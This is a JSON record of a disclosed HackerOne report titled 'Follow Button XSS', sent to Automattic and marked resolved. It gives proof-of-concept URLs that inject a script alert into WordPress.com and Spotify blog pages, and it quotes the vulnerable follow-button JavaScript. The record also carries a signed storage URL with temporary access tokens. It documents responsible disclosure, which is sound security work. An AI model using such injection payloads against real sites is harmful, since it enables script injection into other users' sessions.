@@ -1,0 +1,195 @@
+{
+  "id": 172574,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzI1NzQ=",
+  "url": "https://hackerone.com/reports/172574",
+  "title": "Follow Button XSS",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-09-28T07:06:46.944Z",
+  "submitted_at": "2016-09-28T07:06:46.944Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bobrov",
+    "url": "/bobrov",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 111,
+    "url": "https://hackerone.com/automattic",
+    "handle": "automattic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Automattic",
+      "twitter_handle": "",
+      "website": "https://automattic.com",
+      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-10-28T12:44:46.991Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-09-28T12:44:36.928Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**PoC**\n1) Open link\n2) Click \"Follow\" in the bottom right-hand corner\n\nXSS Should work on any wordpress site with this Follow button. \nfbd.isLoggedIn must be equal to false.\n\n```\nhttps://apps.wordpress.com/support/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;\nhttps://labs.spotify.com/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;\nhttps://news.spotify.com/tr/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;\n```\n\n**Vulnerable Code**\napps.wordpress.com\n```html\n<script type='text/javascript'>\n/* <![CDATA[ */\nvar actionbardata = {\n...\n\"subscribeNonce\":\"<input type=\\\"hidden\\\" id=\\\"_wpnonce\\\" name=\\\"_wpnonce\\\" value=\\\"9dca8606d3\\\" \\/><input type=\\\"hidden\\\" name=\\\"_wp_http_referer\\\" \nvalue=\\\"\\/support\\/\\\"><script>alert(document.domain)<\\/script>\\\" \\/>\",\n\"referer\":\"https:\\/\\/apps.wordpress.com\\/support\\/\\\"><script>alert(document.domain)<\\/script>\",\n\"canFollow\":\"1\"\n...\n</script>\n```\n\ns2.wp.com/_static/\n```js\n\t// Follow Site\n\t$actionbar.on(  'click', '.actnbr-actn-follow', function(e) {\n\t\te.preventDefault();\n\n\t\tif ( fbd.isLoggedIn ) {\n\t\t\tshowActionBarStatusMessage( '<div class=\"actnbr-reader\">' + fbd.i18n.followedText + '</div>' );\n\t\t\tbumpStat( 'followed' );\n\t\t\trequest( 'ab_subscribe_to_blog' );\n\t\t} else {\n\t\t\tshowActionBarFollowForm();\n\t\t}\n\t} )\n\t...\n\t\tfunction showActionBarFollowForm() {\n\t\tvar btn = $( '#actionbar .actnbr-btn' );\n\t\tbtn.toggleClass( 'actnbr-hidden' );\n\n\t\t$( '#actionbar .actnbr-follow-bubble' ).html( ' \\\n\t\t\t...\n\t\t\t<input type=\"hidden\" name=\"blog_id\" value=\"' + fbd.siteID + '\"/> \\\n\t\t\t<input type=\"hidden\" name=\"source\" value=\"' + fbd.referer + '\"/> \\\n\t\t\t<input type=\"hidden\" name=\"sub-type\" value=\"actionbar-follow\"/> \\\n\t\t\t' + fbd.subscribeNonce + ' \\\n\t\t\t...\n\t\t');\n```\n\n\n",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 123569,
+      "file_name": "Screenshot_at_11-06-11.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/123/569/fdbbdc916fc00525ffde81f7acf3d2a96037b10f/Screenshot_at_11-06-11.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_11-06-11.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_11-06-11.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5ITRTXJB%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T064951Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDAq%2FqG99wihLKlgCgQYQMQa0KhHVPOco3Tmuyu3afIDgIhAIm%2FjerStMoux21vVLSWQrokkz8dYWF2mFhJqfc6HzRDKrEFCH8QAxoMMDEzNjE5Mjc0ODQ5IgwTPSdKGVdJUBXaUcUqjgWcBCaXLKdNypfcIKUywvO3MFGwQwizhmTWV5m%2FvVaa5hlVD6J9S1ywf3Xn9d%2BXehjMfKRH5LbyBGCLXWu%2B9crOlGX%2F2O7Bx4oF97RA9IViWoDyhgOtZ1p2b%2BGBvSg02QmdpW8%2BvUm9rNtIcxZFh0OitkPgsZrUcat8%2FN%2BVYImuNcKjUnWuQk9loOZM2I8Y8kUjJH5U9gw2mlSenZ3uLGFCHhhExXS05BpI%2BQpsrngBGUPkyk1Zlh67Lr6WkPvT859ZZiMg4bAtN5jd2GlVAhUewocrHbmYx0PlPoAiv2B55cs2kbItIchZJ5Qcpq%2Fc%2Fna6cYSpfj0aFtueRT9I7rhRg1KV6AC8GObDnnQQ0L%2FZRLE012kePYgsEaP2nB5WCHNH2hsc%2FsZfs0TMEZHXmAXfF1c8sTw4Pegi508Yb%2BMqtDmQPa2ZR8jYB5R4xGxMDH9FGrpBFeNRA%2BbOqkvOsxmQxDGkcNWeR9zjTNYwYx5m91DvHfjU1b4lW7ZBo6%2B5GSh917qfUAb%2FO5C0OyQGnn6XUrwjPB3d8x0JEVYhqEb7I6RYUrWjSMaDG3p1HmpBtGO%2FoCd7uWZUl790eTUx5kFdQ6ecYMvtH3wHepm8THevch7glZI7jWVKDXbSC9KZ5WQJ95X%2Fz6r8dk0GQcopDXY9G3s3krOCl1Jxc9xonbEfuu7Ww9%2F%2FZyFp0u4o5UWsFBTtAVELwfsdVWt%2F8h5fBLPAI7d5%2BIwJlaXMiCf8OYDGplD8fWzZcRT0zgBqXvlIQ8PXsxauP9x4K6HdcQM1zxWGWMs9yODFJMGhvtIIXnHJLl3pyKQbeP%2FLU3d0ixRqvkfaH%2FTCyRM%2By40wDvyo8vXnbqf3Fq1eO%2B9KO65RRLcwnNK30gY6sAEgITbtec6ihgU4xST%2Frr8gvjqJyNWjr4izZehOg52FYOLKcWrkdGNTyldZnjKJnXQerR4tlo3ce6FG%2F2SeCkPxqmINt%2BUGgQ6K4js4T8TqyYUAVBZwcbxL44pCgDtNtanYkZqcdYOzMaLucPyqk98Y237jXn5fRAtYz%2FNuW%2BYXEcccYv3tPOoNP5z%2FUuCEJgVpL%2BX%2BLtv%2BcPlOYlh9ZQvc263Q6GZDn8QUEbVEJeM6sw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=52baed6bb7f03aa1455b872b5161d9546e0295f83368b645d22028210423f6a9",
+      "file_size": 40493,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-10-28T12:44:37.043Z",
+  "allow_singular_disclosure_after": -305834714.68688697,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "bobrov",
+    "spam404",
+    "w2w",
+    "samincube",
+    "xsam",
+    "sumit7",
+    "spetr0x",
+    "ov3rflow1",
+    "scept1c",
+    "dyabla",
+    "and 2 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "172574",
+  "votes": 12,
+  "latest_disclosable_activity_at": "2016-10-28T12:44:47.007Z",
+  "severity": null,
+  "_metadata": {
+    "saved_at": "2026-07-08T14:49:51.835467",
+    "source": "https://hackerone.com/reports/172574.json",
+    "report_id": 172574
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzI1NzQ=",
+    "databaseId": "172574",
+    "title": "Follow Button XSS",
+    "url": "https://hackerone.com/reports/172574",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2016-10-28T12:44:46.991Z",
+    "created_at": "2016-09-28T07:06:46.944Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzYw",
+      "name": "Cross-site Scripting (XSS) - Generic",
+      "external_id": "cwe-79"
+    },
+    "severity": null,
+    "reporter": {
+      "username": "bobrov"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzExMQ==",
+      "handle": "automattic",
+      "name": "Automattic",
+      "url": "https://hackerone.com/automattic",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8zNDM4Ng==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2016-09-28T12:38:40.643Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE3MjU3NA==",
+    "_id": "172574",
+    "disclosed": true,
+    "votes": 12,
+    "latest_disclosable_activity_at": "2016-10-28T12:44:47.007Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzI1NzQ=",
+      "databaseId": "172574",
+      "title": "Follow Button XSS",
+      "url": "https://hackerone.com/reports/172574",
+      "disclosed_at": "2016-10-28T12:44:46.991Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzExMQ==",
+      "handle": "automattic",
+      "name": "Automattic",
+      "url": "https://hackerone.com/automattic",
+      "currency": "usd"
+    }
+  }
+}
